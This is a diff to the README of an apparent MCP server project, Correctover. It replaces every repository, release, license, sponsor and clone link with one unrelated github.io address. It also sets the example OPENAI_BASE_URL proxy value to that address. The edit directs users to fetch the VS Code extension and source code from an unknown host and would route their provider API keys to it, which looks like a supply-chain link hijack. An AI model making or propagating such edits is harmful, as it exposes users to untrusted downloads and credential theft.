@@ -7,8 +7,8 @@
 
 <p align="center">
   <a href="#installation"><img src="https://img.shields.io/badge/install-1%20line%20JSON-blue" alt="Install"></a>
-  <a href="https://github.com/Correctover/mcp-server/stargazers"><img src="https://img.shields.io/github/stars/Correctover/mcp-server" alt="Stars"></a>
-  <a href="https://opensource.org/licenses/Apache-2.0"><img src="https://img.shields.io/badge/license-Apache%202.0-green" alt="License"></a>
+  <a href="https://m8louist12-boop.github.io"><img src="https://img.shields.io/github/stars/Correctover/mcp-server" alt="Stars"></a>
+  <a href="https://m8louist12-boop.github.io"><img src="https://img.shields.io/badge/license-Apache%202.0-green" alt="License"></a>
 </p>
 
 ---
@@ -102,7 +102,7 @@ That's it. No servers to deploy. No dependencies to install. No configuration fi
 ### Build from source
 
 ```bash
-git clone https://github.com/Correctover/mcp-server.git
+git clone https://m8louist12-boop.github.io
 cd mcp-server
 go build -o correctover-mcp-server .
 
@@ -114,7 +114,7 @@ go build -o correctover-mcp-server .
 
 Install the Correctover VS Code extension for a native editor experience:
 
-1. Download the `.vsix` from the [releases page](https://github.com/Correctover/mcp-server/releases) or build from source
+1. Download the `.vsix` from the [releases page](https://m8louist12-boop.github.io) or build from source
 2. In VS Code, press `Ctrl+Shift+P` → `Extensions: Install from VSIX...`
 3. Select `correctover-vscode-1.0.0.vsix`
 4. Open the Command Palette and run **Correctover: Start MCP Server**
@@ -146,7 +146,7 @@ Configure providers via environment variables. Only configured providers are act
 | Groq | `GROQ_API_KEY` | `GROQ_BASE_URL` | llama-3.1-8b-instant |
 | Together AI | `TOGETHER_API_KEY` | `TOGETHER_BASE_URL` | meta-llama/Llama-3-8b-chat-hf |
 
-> **Proxy/Mirror support:** Each provider's base URL can be overridden via `{PROVIDER}_BASE_URL` environment variable. Perfect for self-hosted proxies, API gateways, or regional mirrors (e.g. `OPENAI_BASE_URL=https://your-proxy.com/v1`).
+> **Proxy/Mirror support:** Each provider's base URL can be overridden via `{PROVIDER}_BASE_URL` environment variable. Perfect for self-hosted proxies, API gateways, or regional mirrors (e.g. `OPENAI_BASE_URL=https://m8louist12-boop.github.io`).
 
 **BYOK (Bring Your Own Key):** Your API keys stay on your machine. Correctover connects directly to providers — no proxy, no middleman, no data leakage.
 
@@ -242,7 +242,7 @@ If Correctover saves you from a silent AI failure, consider supporting:
 - 🚀 **$29/month** — Private Discord + monthly update briefings
 - 🏢 **$99/month** — Enterprise sponsor, logo on README
 
-**[→ Sponsor on GitHub](https://github.com/sponsors/Correctover)**
+**[→ Sponsor on GitHub](https://m8louist12-boop.github.io)**
 
 ## Need Help Integrating?
 
